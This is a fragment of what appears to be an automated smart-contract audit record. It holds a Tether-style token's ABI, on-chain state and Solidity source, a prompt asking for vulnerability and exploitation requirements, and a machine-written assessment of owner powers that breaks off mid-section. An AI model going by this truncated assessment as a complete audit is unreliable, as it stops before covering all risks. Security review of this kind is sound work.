"name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99748409580000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe analyzed contract is **TetherToken**, an ERC20 token implementation with additional features: pausable transfers, blacklisting, token issuance and redemption by the owner, and upgradeability (deprecate and forward calls to a new contract). It inherits from `Pausable`, `StandardToken`, and `BlackList`. The contract holds user token balances and can hold user funds in the form of tokens.\n\nKey features and components:  \n- **Pausable:** Owner can pause/unpause token transfers globally.  \n- **BlackList:** Owner can blacklist addresses, preventing them from transferring tokens and can destroy blacklisted users‚Äô token balances (burn tokens).  \n- **Upgradeability:** Owner can deprecate this contract and forward calls to an upgraded contract.  \n- **Fees:** There is a basisPointsRate and maximumFee mechanism for charging fees on transfers, but currently set to zero.  \n- **Token issuance and redemption:** Owner can mint new tokens or redeem (burn) tokens from their own balance.  \n- **ERC20 standard compliance:** Implements transfer, transferFrom, approve, allowance, balanceOf, totalSupply.  \n- Solidity version pragma: `pragma solidity ^0.4.17;`\n\n2. Vulnerability Assessment:  \n\n**A. Centralization / Owner Power Risks**  \n- The owner has **extensive control**: can pause/unpause transfers, blacklist any user, destroy blacklisted users‚Äô tokens, issue new tokens (mint), redeem tokens (burn from owner), set fees, and upgrade the contract.  \n- This centralization means the owner can effectively freeze user funds, confiscate tokens from blacklisted users, and inflate the token supply arbitrarily. This is a **trust and censorship risk**, not a technical bug but a critical economic and permission risk.\n\n**B. Blacklist and Destroy Black Funds**  \n- The owner can blacklist any user and then call `destroyBlackFunds` to zero out their balance and reduce total supply accordingly.  \n- This is a **backdoor to confiscate tokens** from any user arbitrarily.  \n- No user consent or on-chain governance is required.  \n- This can be abused maliciously or if the owner key is compromised.\n\n**C. Upgradeability and Deprecated Contract Forwarding**  \n- The contract 